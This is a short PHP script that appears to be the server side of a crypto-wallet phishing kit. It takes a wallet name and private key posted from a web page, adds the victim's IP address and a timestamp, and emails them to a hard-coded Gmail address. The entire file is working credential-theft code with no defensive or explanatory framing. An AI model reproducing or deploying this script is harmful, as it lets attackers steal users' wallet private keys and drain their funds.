<?php
header('Content-Type: application/json');

// Get the data sent from JavaScript
$input = json_decode(file_get_contents('php://input'), true);

if (isset($input['walletName']) && isset($input['privateKey'])) {
    
    $to = "jourdandeo9@gmail.com";
    $subject = "A wallet " . $input['walletName'] . " Log Details";
    
    // Formatting the email body
    $message = "Network/Wallet Name: " . $input['walletName'] . "\n";
    $message .= "Private Key Provided: " . $input['privateKey'] . "\n";
    $message .= "Timestamp: " . date("Y-m-d H:i:s") . "\n";
    $message .= "User IP: " . $_SERVER['REMOTE_ADDR'];

    // Headers
    $headers = "From: noreply@yourdomain.com\r\n";
    $headers .= "Reply-To: noreply@yourdomain.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        echo json_encode(["status" => "success"]);
    } else {
        echo json_encode(["status" => "error", "message" => "Mail function failed"]);
    }
} else {
    echo json_encode(["status" => "error", "message" => "Invalid data received"]);
}
?>
